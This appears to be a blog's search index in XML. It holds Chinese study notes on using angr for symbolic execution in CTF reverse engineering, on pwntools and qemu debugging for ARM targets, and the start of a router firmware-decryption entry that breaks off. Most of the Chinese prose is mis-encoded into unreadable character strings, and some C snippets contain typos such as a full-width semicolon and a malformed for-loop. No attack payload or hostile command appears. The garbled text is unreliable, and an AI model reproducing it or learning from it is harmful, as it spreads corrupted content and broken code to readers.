<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Angr Learning Note</title>
    <url>/2023/10/20/Angr%20Learning%20Note/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
è¿ˆå‘è‡ªåŠ¨åŒ–çš„ç¬¬äºŒæ­¥â€”â€”
</blockquote>
<span id="more"></span>
<h1 id="xff-reference">0xFF Reference</h1>
<p><a href="https://heygap.github.io/2023/09/30/blog9/#more">1. Symbolic
Execution Leaning Note (1) -- Basis</a><br />
<a href="https://xz.aliyun.com/t/7117#toc-22">2.
2020å¹´Angr-Apiéå®˜æ–¹ä»‹ç»</a><br />
<a
href="https://github.com/jakespringer/angr_ctf/blob/master/SymbolicExecution.pptx">3.
angr_ctfé‡Œä»‹ç»angrçš„ppt(è®²çš„çœŸçš„æŒºå¥½çš„)</a></p>
<h1 id="x00-recall-symbolic-execution">0x00 Recall-Symbolic
Execution</h1>
<p>ç¬”è€…æ°´å¹³æœ‰é™ï¼Œå¦‚æœ‰é”™è¯¯è¯·æŒ‡å‡º ;-)</p>
<p>æˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹ä»€ä¹ˆæ˜¯ç¬¦å·æ‰§è¡Œï¼š<br />
æˆ‘ä»¬åœ¨é€†å‘ä¸€ä¸ªç¨‹åºã€å»æ‰¾ä¸€ä¸ªç¨‹åºçš„æ¼æ´æ—¶ï¼Œæˆ‘ä»¬ä¼šå¸Œæœ›æ‰¾åˆ°ä¸€ä¸ª<code>input</code>,æ¥è§¦å‘æˆ‘ä»¬éœ€è¦çš„æ¼æ´æˆ–è€…æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„flagï¼Œè€Œç¬¦å·æ‰§è¡Œçš„åŠŸèƒ½å°±æ˜¯<strong>é€šè¿‡éå†ç¨‹åºæ‰€æœ‰å¯èƒ½çš„â€œçŠ¶æ€(State)â€ï¼Œæ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„Stateï¼Œè¿›è€Œé€šè¿‡çº¦æŸæ±‚è§£å™¨ï¼Œæ±‚è§£å‡ºæˆ‘ä»¬æœ€åéœ€è¦çš„input</strong></p>
<p>å®è§‚ä¸Šçœ‹ï¼Œç¬¦å·æ‰§è¡Œå¯ä»¥åˆ†ä¸º<code>ä¸‰æ­¥</code><br />
1. æ³¨å…¥ç¬¦å· 2. åˆ†æ”¯ 3. æ‰§è¡Œåˆ†æ”¯</p>
<p>æˆ‘ä»¬ç”¨ä¸€ä¸ªç®€å•çš„å‡½æ•°æ¥åˆ†åˆ«çœ‹ä¸€ä¸‹è¿™ä¸‰æ­¥æ˜¯ä»€ä¹ˆ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// demo func</span><br><span class="line"></span><br><span class="line">Line1  void check_func(char* passwd)</span><br><span class="line">Line2  &#123;</span><br><span class="line">Line3      if(passwd == &quot;HeyGap&quot;)</span><br><span class="line">Line4          printf(&quot;Access granted&quot;);</span><br><span class="line">Line5      else</span><br><span class="line">Line6          printf(&quot;Access denied&quot;);</span><br><span class="line">Line7  &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="æ³¨å…¥ç¬¦å·inject-symbols">1. æ³¨å…¥ç¬¦å·(Inject Symbols)</h3>
<ul>
<li>ä»€ä¹ˆæ˜¯æ³¨å…¥ç¬¦å·ï¼Ÿ<br />
æˆ‘ä»¬åœ¨<code>å…·ä½“æ‰§è¡Œ</code>çš„æ—¶å€™ï¼Œä¼ å…¥çš„passwdæ˜¯ä¸€ä¸ªå…·ä½“çš„å­—ç¬¦ä¸²ï¼›å¯æˆ‘ä»¬åœ¨<code>ç¬¦å·æ‰§è¡Œ</code>æ—¶ï¼Œä¼ å…¥çš„æ˜¯ä¸€ä¸ª<code>ç¬¦å·</code>ã€‚</li>
<li>ä»€ä¹ˆæ˜¯ç¬¦å·ï¼Ÿ
ç±»æ¯”äºæˆ‘ä»¬å°å­¦å­¦çš„æ–¹ç¨‹<code>x + 1 = 2</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™æ ·ä¸€ä¸ªæ–¹ç¨‹æ¥æ±‚è§£å‡ºå˜é‡xï¼Œæˆ‘ä»¬ä¹Ÿç§°â€œè¿™ä¸ªæ–¹ç¨‹çº¦æŸäº†è¿™ä¸ªå˜é‡xâ€ï¼›è€Œ<code>ç¬¦å·</code>å°±æ˜¯æ–¹ç¨‹ä¸­çš„<code>å˜é‡</code>ï¼Œç”¨æ¥çº¦æŸç¬¦å·çš„<code>æ‰§è¡Œè·¯å¾„</code>å°±å¯ä»¥ç±»æ¯”æˆ<code>æ–¹ç¨‹</code></li>
<li>ä»€ä¹ˆæ˜¯æ‰§è¡Œè·¯å¾„ï¼Ÿ<br />
ä»State_Aåˆ°State_Bçš„<code>æ‰§è¡Œè·¯å¾„</code>å°±æ˜¯<strong>ä»èµ·ç‚¹Aå¯ä»¥æ‰§è¡Œåˆ°ç»ˆç‚¹Bçš„ä¸€æ¡æŒ‡ä»¤(instructions)è·¯å¾„</strong>,åœ¨æ¯æ¡æ‰§è¡Œè·¯å¾„ä¸­éƒ½ä¼šç»´æŠ¤ä¸€ä¸ªç¬¦å·å˜é‡<code>pc</code>ï¼Œpcè®°å½•äº†â€œä»Aç‚¹å‡ºå‘ï¼Œè¦åˆ°è¾¾Bçš„å…¨éƒ¨æ¡ä»¶â€ï¼Œè¿™ä¸ªç¬¦å·å˜é‡çš„ç±»å‹æ˜¯é€»è¾‘è¡¨è¾¾å¼ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªç¬¦å·å˜é‡æ‰”åˆ°SMTæ±‚è§£å™¨ï¼ˆæ¯”å¦‚z3ï¼‰ä¸­å»æ±‚è§£æ»¡è¶³è¿™ä¸ªç¬¦å·å˜é‡ä¸­æ‰€æœ‰çº¦æŸæ¡ä»¶çš„1~nä¸ªè§£</li>
<li>Example<br />
åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†ä¸€ä¸ªç¬¦å·ä¼ å…¥passwdä¸­ï¼Œå°±æ˜¯æ³¨å…¥ç¬¦å·ã€‚</li>
</ul>
<h3 id="åˆ†æ”¯branching">2. åˆ†æ”¯(Branching)</h3>
<ul>
<li>ä»€ä¹ˆæ˜¯branching<br />
ç”±äºæˆ‘ä»¬çš„ç¬¦å·æ˜¯ä¸€ä¸ªå¾…ç¡®å®šçš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨é‡åˆ°<code>åˆ¤æ–­è¯­å¥</code>æ—¶ï¼Œå½“å‰çš„Stateä¼šè®¾ç½®ä¸ºæ‰§è¡Œå®Œæ¯•(already
executed)ï¼Œç„¶åæ¿€æ´»(active)ä¸¤ä¸ªæ–°çš„stateï¼Œç”±äºè¦éå†å…¨éƒ¨stateï¼Œç¬¦å·åœ¨åˆ¤æ–­è¯­å¥ä¸­å¾—åˆ°ä¸åŒè¿”å›å€¼ï¼Œè€Œè¿™ä¸¤ä¸ªstateå°±æ˜¯ä¸åŒè¿”å›å€¼è¿›å…¥çš„ä¸åŒåˆ†æ”¯çš„èµ·å§‹çŠ¶æ€</li>
<li>Example
åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼Œå¯ä»¥ç†è§£ä¸ºLine1-2ä¸ºstate1ï¼Œå½“æ‰§è¡Œåˆ°Line3æ—¶ï¼Œstate1è®¾ç½®ä¸ºæ‰§è¡Œå®Œæ¯•ï¼ŒåŒæ—¶æ¿€æ´»state2å’Œstate3ï¼Œstate2ä¸ºLine4ï¼Œstate3ä¸ºLine6</li>
</ul>
<h3 id="è¯„ä¼°åˆ†æ”¯evaluate-each-branches">3. è¯„ä¼°åˆ†æ”¯(Evaluate Each
Branches)</h3>
<ul>
<li>ä»€ä¹ˆæ˜¯Evaluate Branchesï¼Ÿ<br />
æˆ‘ä»¬ä¼šè¯„ä¼°(Evaluate)æ¯ä¸€ä¸ªactiveçš„stateï¼Œåˆ¤æ–­ä»–ä»¬æ˜¯å¦ç¬¦åˆæˆ‘ä»¬çš„éœ€æ±‚ï¼Œå¦‚æœä¸æ»¡è¶³å°±è®¾ç½®terminatedï¼Œå¦‚æœé‡åˆ°åˆ¤æ–­è¯­å¥å°±è¿›å…¥ç¬¬äºŒæ­¥</li>
<li>Example
å‡è®¾å½“å‰æ¿€æ´»çš„stateä¸º2å’Œ3ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦â€œæ ‡å‡†è¾“å‡ºä¸­åŒ…å«'granted'â€ï¼Œé‚£ç¬¦å·æ‰§è¡Œå™¨å°±ä¼šè¯„ä¼°state2ï¼Œå‘ç°è¿™ä¸ªstateç¬¦åˆæˆ‘ä»¬çš„è¦æ±‚ï¼Œäºæ˜¯å°†state2åŠ åˆ°foundæ•°ç»„ä¸­ï¼›ç„¶åå†è¯„ä¼°state3ï¼Œå‘ç°ä¸ç¬¦åˆï¼Œè®¾ç½®ä¸ºterminated</li>
</ul>
<h1 id="x01-an-introduction-to-angr">0x01 An Introduction to Angr</h1>
<h3 id="å‡ºç°çš„class">1. å‡ºç°çš„class</h3>
<p>ç¬”è€…åœ¨æ­¤è®°å½•ç›¸å¯¹é‡è¦çš„classï¼Œè¯»è€…å¯ä»¥é€šè¿‡é˜…è¯»æºç æˆ–å®˜æ–¹æ‰‹å†Œç­‰æ–¹å¼ï¼Œå…ˆå¼„æ¸…æ¥šè¿™äº›classçš„ä½œç”¨
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SimState</span><br><span class="line">Simulation Manager(simgr)</span><br></pre></td></tr></table></figure></p>
<h3 id="symbolic-execution-in-angr">2. Symbolic Execution In Angr</h3>
<p>é€šè¿‡0x00ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨ç¬¦å·æ‰§è¡Œä¸­ï¼Œ<code>æ‰§è¡Œè·¯å¾„</code>å’Œ<code>ç¬¦å·</code>æ˜¯æœ€é‡è¦çš„ä¸¤ä¸ªä¸œè¥¿
- Angrä¸­çš„æ‰§è¡Œè·¯å¾„<br />
1.
æˆ‘ä»¬çŸ¥é“æ¯branchä¸€æ¬¡ï¼Œå°±ä¼šæ·»åŠ ä¸¤ä¸ªstateï¼Œè€Œåœ¨Angrä¸­ï¼Œç»´æŠ¤è·¯å¾„ä¿¡æ¯çš„pcç”±<code>SimState</code>
Objectç»„æˆï¼ŒSimStateç”¨âˆ©é“¾åœ¨ä¸€èµ·å°±ç»„æˆäº†pc 2.
ç”±äºæˆ‘ä»¬è¦éå†å…¨éƒ¨stateï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æœ‰ä¸€ä¸ªç®¡ç†å™¨æ¥ç®¡ç†å…¨éƒ¨æ‰§è¡Œè·¯å¾„(a
Set of
Path)ï¼Œè¿™ä¸ªç®¡ç†å™¨å°±æ˜¯<code>Simulation Manager (simgr)</code>,ä¸‹å›¾ä¸ºAngrä¸­ç”Ÿæˆå…¨éƒ¨è·¯å¾„çš„è¿‡ç¨‹
<img src="/pic/1.png" /> 3.
ä¸Šå›¾æåˆ°<code>until we find what we want</code>ï¼Œsimgræä¾›äº†å‡½æ•°<code>explore</code>ï¼Œå¯ä»¥è®©æˆ‘ä»¬é€šè¿‡ä¸¤ç§æ–¹å¼æ¥æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„state<br />
1. é€šè¿‡æŒ‡ä»¤åœ¨textæ®µçš„åœ°å€ 2. é€šè¿‡ä»»æ„ä½“ç°stateç‰¹å¾çš„å‡½æ•°</p>
<ul>
<li>State Explosion
<ol type="1">
<li>ä½†æ˜¯å•çº¯çš„éå†æ¯ä¸€æ¡è·¯å¾„ä¼šå­˜åœ¨çŠ¶æ€çˆ†ç‚¸(State
Explosionï¼Œæœ‰äº›åœ°æ–¹ä¹Ÿå«è·¯å¾„çˆ†ç‚¸)çš„é—®é¢˜ï¼Œæ¥çœ‹ä¸‹é¢è¿™ä¸ªå¾ªç¯
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> xï¼›</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="number">0</span>;i&lt;<span class="number">100</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(x &gt; <span class="number">10</span>)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Good&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>å½“i=1æ—¶ï¼Œç®¡ç†å™¨ä¼šåˆ›å»ºä¸¤ä¸ªstateï¼Œè€Œi=2æ—¶ï¼Œå…ˆå‰çš„ä¸¤ä¸ªstateæœ‰åˆ†åˆ«ä¼šåˆ›å»ºä¸¤ä¸ªstateï¼Œå½“i=100æ—¶ï¼Œæˆ‘ä»¬å°±ä¼šå‡ºç°2^100ä¸ªstateï¼Œè¿™å°±æ˜¯çŠ¶æ€çˆ†ç‚¸é—®é¢˜</li>
<li>è€Œexploreä¹Ÿä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå‚æ•°avoidï¼Œæ•ˆæœå°±æ˜¯<code>å‰ªæ</code>ï¼Œåœ¨exploreä¸­æ·»åŠ avoidå‚æ•°ä¼šå¸®åŠ©æˆ‘ä»¬æå‰terminateé‚£äº›æˆ‘ä»¬ä¸éœ€è¦çš„stateï¼Œå› æ­¤è¿™ä¸ªstateåç»­çš„branchå°±ä¸ä¼šå†è·Ÿè¿›</li>
</ol></li>
</ul>
<h1 id="x01-åº“æ¶æ„åˆ†æ">0x01 åº“æ¶æ„åˆ†æ</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">angr</span><br><span class="line"> | - Project()</span><br><span class="line">		 | - factory</span><br><span class="line">				 | - state</span><br><span class="line">					   | - entry_state()</span><br><span class="line">					   | - blank_state(addr)</span><br><span class="line"></span><br><span class="line">					   | - regs.eax/ebx/...</span><br><span class="line">					   | - solver</span><br><span class="line">							  | - BVS</span><br><span class="line">							  | - eval</span><br><span class="line">					   | - fs</span><br><span class="line">						    | - insert(string filename,angr.storage.SimFile())</span><br><span class="line">				 | - simulation_manager(init_state)</span><br><span class="line">						 | - explore(find,avoid)</span><br><span class="line">						 | - found[]</span><br><span class="line"></span><br><span class="line"> | - storage</span><br><span class="line">		 | - SimFile(filename,content,size)</span><br><span class="line"> | - sim_options</span><br><span class="line">		 | - SYMBOL_FILL_UNCONSTRAINED_MEMORY</span><br><span class="line">		 | - SYMBOL_FILL_UNCONSTRAINED_REGISTERS</span><br><span class="line"></span><br><span class="line">found_state</span><br><span class="line">	 | - posix</span><br><span class="line">		   | - dumps(std)</span><br><span class="line">	 | - solver</span><br><span class="line">		   | - eval(claripy.BVS pass,cast_to)</span><br></pre></td></tr></table></figure>
<h1 id="x02-apiæ‰‹å†Œ">0x02 APIæ‰‹å†Œ</h1>
<ul>
<li><strong>Projectç±»(å‚æ•°ã€åŠŸèƒ½ã€é‡è½½ã€è¿”å›å€¼)</strong>
<ol type="1">
<li>æ„é€ å‡½æ•°å‚æ•°ï¼šâ€œå‘½ä»¤è¡Œä¸­è¿è¡Œç¨‹åºçš„æŒ‡ä»¤â€(eg: "./00_angr_find")</li>
<li>åŠŸèƒ½ï¼šâ€œæ„å»ºä¸€ä¸ªç¬¦å·æ‰§è¡Œé¡¹ç›®â€</li>
<li>é™„å±æˆå‘˜
<ul>
<li><strong>factory</strong>
<ol type="1">
<li>é™„å±æˆå‘˜
<ul>
<li><strong>state</strong>
<ol type="1">
<li>é‡è½½å‡½æ•°
<ul>
<li><strong>entry_state()</strong>
<ol type="1">
<li>è¿”å›å€¼ï¼šç¨‹åºå…¥å£ç‚¹</li>
</ol></li>
<li><strong>blank_state(addr)</strong>
<ol type="1">
<li>å‚æ•°ï¼šæ¨¡æ‹Ÿæ‰§è¡Œå¼€å§‹çš„åœ°å€</li>
</ol></li>
</ul></li>
<li>é™„å±æˆå‘˜
<ul>
<li><strong>regs</strong>
<ol type="1">
<li>é™„å±æˆå‘˜: å„ç§å¯„å­˜å™¨</li>
</ol></li>
<li><strong>fs</strong>
<ol type="1">
<li>å…¨ç§°: filesystem</li>
<li>é™„å±æˆå‘˜ï¼š
<ul>
<li><strong>insert(string filename,angr.storage.simFile)</strong>
<ol type="1">
<li>å‚æ•°1ï¼šæ–‡ä»¶åç§°</li>
<li>å‚æ•°2ï¼šåˆ›å»ºè¿‡çš„ç¬¦å·åŒ–æ–‡ä»¶å¯¹è±¡</li>
</ol></li>
</ul></li>
</ol></li>
</ul></li>
</ol></li>
<li><strong>simulation_managerç±»</strong>
<ol type="1">
<li>æ„é€ å‡½æ•°å‚æ•°ï¼šèµ·å§‹çŠ¶æ€</li>
<li>åŠŸèƒ½ï¼šè®¾ç½®æ¨¡æ‹Ÿæ‰§è¡Œçš„èµ·å§‹åœ°å€ï¼Œå¹¶è¿”å›å®ä¾‹åŒ–å¯¹è±¡</li>
<li>é™„å±æˆå‘˜
<ul>
<li><strong>explore(find, avoid)</strong>
<ol type="1">
<li>å‚æ•°findï¼šå¸Œæœ›ç¨‹åºæŠµè¾¾çš„åœ°å€</li>
<li>å‚æ•°avoidï¼šå¸Œæœ›ç¨‹åºä¸æŠµè¾¾çš„åœ°å€</li>
<li>åŠŸèƒ½ï¼šç”¨ç¬¦å·æ¢ç´¢åˆ°findæŒ‡å‘çš„åœ°å€ï¼Œå¹¶é¿å…avoidæŒ‡å‘çš„åœ°å€</li>
<li>é‡è½½ï¼šexplore(find=func1,avoid=func2) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def func1(state):</span><br><span class="line">	return b&quot;Good Job!&quot; in state.posix.dumps(1)</span><br><span class="line">def func2(state):</span><br><span class="line">	return b&quot;Try Again!&quot; in state.posix.dumps(1)</span><br></pre></td></tr></table></figure>
<ol type="1">
<li>åŠŸèƒ½ï¼šæ¢ç´¢å…·æœ‰func1ç‰¹å¾çš„çš„å‡½æ•°åˆ†æ”¯ï¼Œå›é¿å…·æœ‰func2ç‰¹å¾çš„å‡½æ•°åˆ†æ”¯</li>
</ol></li>
</ol></li>
<li><strong>foundæ•°ç»„</strong>
<ol type="1">
<li>found_stateçš„å®ä¾‹åŒ–æ•°ç»„</li>
</ol></li>
</ul></li>
</ol></li>
</ul></li>
</ol></li>
</ul></li>
</ol></li>
<li><strong>found_stateç±»</strong>
<ul>
<li><strong>posix</strong>
<ul>
<li><strong>dumps(int std)</strong>
<ol type="1">
<li>å‚æ•°std: stdin(0)/stdout(1)/stderr(2)</li>
<li>åŠŸèƒ½: å°†stdæŒ‡å‘çš„å†…å®¹æ‰“å°å‡ºæ¥</li>
</ol></li>
</ul></li>
<li>solver
<ul>
<li>eval(claripy.BVS arg1)
<ol type="1">
<li>å‚æ•°ï¼šè¦æ±‚è§£çš„çº¦æŸå…¬å¼</li>
<li>åŠŸèƒ½ï¼šæ±‚è§£arg1å¹¶è¿”å›ç»“æœ</li>
</ol></li>
</ul></li>
</ul></li>
<li><strong>claripyç±»</strong>
<ul>
<li><strong>BVSç±»</strong>
<ol type="1">
<li>æ„é€ å‡½æ•°å‚æ•°ï¼šarg1: åˆ«å | arg2: ç¬¦å·å‘é‡å å¤šå°‘ä½</li>
<li>åŠŸèƒ½ï¼šæ„å»ºä¸€ä¸ªç©ºçš„çº¦æŸå…¬ç¤º</li>
</ol></li>
</ul></li>
<li><strong>storageç±»</strong>
<ul>
<li>SimFile(filename,content,size)
<ol type="1">
<li>å‚æ•°filenameï¼šè¦å¼•å…¥çš„filename</li>
<li>å‚æ•°contentï¼šç¬¦å·åŒ–å‘é‡</li>
<li>å‚æ•°sizeï¼šè¦ä»æ–‡ä»¶ä¸­è¯»å–çš„å­—èŠ‚æ•°*8ï¼ˆå•ä½ï¼šbitsï¼‰</li>
<li>åŠŸèƒ½ï¼šåˆ›å»ºä¸€ä¸ªç¬¦å·åŒ–çš„æ–‡ä»¶å¯¹è±¡</li>
</ol></li>
</ul></li>
<li><strong>sim_optionsç±»</strong>
<ul>
<li>SYMBOL_FILL_UNCONSTRAINED_MEMORY
<ul>
<li>åŠŸèƒ½ï¼šè‡ªåŠ¨ç”¨ç¬¦å·å¡«å……æœªçº¦æŸçš„å†…å­˜ï¼ˆæ¨¡æ‹Ÿè¿‡ç¨‹ä¸­æ²¡æœ‰æ˜ç¡®å€¼çš„å†…å­˜ä½ç½®ï¼‰</li>
</ul></li>
<li>SYMBOL_FILL_UNCONSTRAINED_REGISTERS
<ul>
<li>åŠŸèƒ½ï¼šè‡ªåŠ¨ç”¨ç¬¦å·å¡«å……æœªçº¦æŸçš„å¯„å­˜å™¨</li>
</ul></li>
</ul></li>
</ul>
<h1 id="x01-angrè¯­æ³•">0x01 Angrè¯­æ³•</h1>
<h3 id="å‡†å¤‡é˜¶æ®µ">1. å‡†å¤‡é˜¶æ®µ</h3>
<ul>
<li><p><strong>å¼•å…¥ä¸åˆå§‹åŒ–</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(exec_path)</span><br><span class="line"></span><br><span class="line">init_state = p.factory.entry_state()</span><br><span class="line"><span class="comment"># init_state = p.factory.blank_state(addr) # addr = 0xbeef</span></span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(init_state)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>å‘½ä»¤è¡Œå¼•å…¥å‚æ•°</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">	arg1 = argv[<span class="number">1</span>]</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	main(sys.argv)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>ç¬¦å·å‘é‡</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line">pass1 = claripy.BVS(<span class="string">&#x27;pass1&#x27;</span>, <span class="number">32</span>)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>ç¬¦å·åŒ–å¯„å­˜å™¨</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">init_state.regs.eax = pass1</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>ç¬¦å·åŒ–æ–‡ä»¶</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">filename = <span class="string">&quot;&quot;</span></span><br><span class="line">filesize = </span><br><span class="line"></span><br><span class="line">password = init_state.solver.BVS(<span class="string">&#x27;password&#x27;</span>,filesize*<span class="number">8</span>)</span><br><span class="line">sim_file = angr.storage.SimFile(filename,content=password,size=filesize)</span><br><span class="line"></span><br><span class="line">init_state.fs.insert(sim_file)</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h3 id="æ¢ç´¢é˜¶æ®µ">2. æ¢ç´¢é˜¶æ®µ</h3>
<ul>
<li><p><strong>æ¢ç´¢æŒ‡å®šåœ°å€å¹¶æŸ¥çœ‹æ ‡å‡†æµ</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sm.explore(find = addr_to_find)</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>åˆ©ç”¨å‡½æ•°exploreåˆ†æ”¯</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_good</span>(<span class="params">state</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="string">b&quot;Good Job!&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_bad</span>(<span class="params">state</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="string">b&quot;Try Again!&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sm.explore(find=is_good, avoid=is_bad)</span><br><span class="line"><span class="comment"># sm.explore(find=addr_find, avoid=addr_avoid)</span></span><br></pre></td></tr></table></figure></p></li>
</ul>
<h3 id="è¾“å‡ºé˜¶æ®µ">3. è¾“å‡ºé˜¶æ®µ</h3>
<ul>
<li><p><strong>æŸ¥çœ‹ç»“æœ</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">	found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;[x] Solution: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(found_state.posix.dumps(<span class="number">0</span>)))</span><br></pre></td></tr></table></figure></p></li>
<li><p><strong>æ±‚è§£å¯„å­˜å™¨çš„ç¬¦å·å‘é‡</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">result = init_state.solver.<span class="built_in">eval</span>(BVS)</span><br></pre></td></tr></table></figure></p></li>
</ul>
]]></content>
      <categories>
        <category>Software analysis technology</category>
      </categories>
      <tags>
        <tag>SymbolicExecution</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn - Architecture other than LinuxC</title>
    <url>/2024/02/09/Pwn%20-%20Architecture%20other%20than%20LinuxC/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
æ€»ç»“ä¸€ä¸‹å¼‚æ¶æ„çš„ç›¸å…³å†…å®¹ï¼Œä¾¿äºåç»­è°ƒç”¨
</blockquote>
<span id="more"></span>
<h1 id="ç›®å½•">ç›®å½•</h1>
<ol type="1">
<li><a href="#1-different-language">Different Language</a>
<ul>
<li><a href="#1-1-python">python</a></li>
</ul></li>
<li><a href="#2-different-architecture">Different Architecture</a>
<ul>
<li><a href="#2-1-arm">ARM</a></li>
</ul></li>
</ol>
<h1 id="different-language">[1] Different Language</h1>
<h2 id="python">[1-1] python</h2>
<h3 id="python-é“¾æ¥-åŠ¨æ€é“¾æ¥åº“">[1-1-1] python é“¾æ¥ åŠ¨æ€é“¾æ¥åº“</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åœ¨ main.py ä¸­æ·»åŠ :</span></span><br><span class="line">sys.path.append(<span class="string">&quot;/absolute/path/to/packagename.cpython-37m-x86_64-linux-gnu.so&quot;</span>)</span><br><span class="line"><span class="comment"># app.cpython-37m-x86_64-linux-gnu.so ä¸­çš„ 37m æŒ‡çš„æ˜¯ python3.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> packagename</span><br></pre></td></tr></table></figure>
<h3 id="ç”¨-pwntools-è°ƒè¯•">[1-1-2] ç”¨ pwntools è°ƒè¯•</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">io = process([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;main.py&#x27;</span>])</span><br></pre></td></tr></table></figure>
<h1 id="different-architecture">[2] Different Architecture</h1>
<h2 id="arm">[2-1] ARM</h2>
<p><a href="https://www.cnblogs.com/yidianhan/p/13060466.html">Manual:
ARM/mipsç³»ç»Ÿè°ƒç”¨å·</a></p>
<h3 id="ç”¨-pwntools-è°ƒè¯•-1">[2-1-1] ç”¨ pwntools è°ƒè¯•</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">io = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç„¶åå†å¼€ä¸€ä¸ªtmux</span></span><br><span class="line"><span class="comment"># ç”¨ gdb-multiarch ./pwn</span></span><br><span class="line"><span class="comment"># åœ¨ gdb ä¸­è¾“å…¥ target remote:1234</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF_Theory</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>IOT - æŸè·¯ç”±å™¨mipså›ºä»¶è§£å¯†è„šæœ¬å¤ç°</title>
    <url>/2023/11/09/IOT%20-%20%20%E6%9F%90%E8%B7%AF%E7%94%B1%E5%99%A8mips%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
æœŸä¸­ç»ˆäºç»“æŸäº†ğŸ˜­å¤ç°ä¸€ä¸‹bç«™Wker666çš„å›ºä»¶è§£å¯†
</blockquote>
<span id="more"></span>
<blockquote>
<p>ç¬¬ä¸€æ¬¡åˆ†æIOTå›ºä»¶ï¼Œä¸å½“ä¹‹å¤„è¯·æŒ‡å‡ºğŸ˜­</p>
</blockquote>
<h1 id="xff-å‰ç½®çŸ¥è¯†">0xFF å‰ç½®çŸ¥è¯†</h1>
<ol type="1">
<li><p>å¤šæ•°æƒ…å†µä¸‹ï¼Œè·¯ç”±å™¨å›ºä»¶è§£åŒ…ä»¥åæˆ‘ä»¬ä¼šæ‹¿åˆ°ä¸€ä¸ªç±»ä¼¼äº Linux
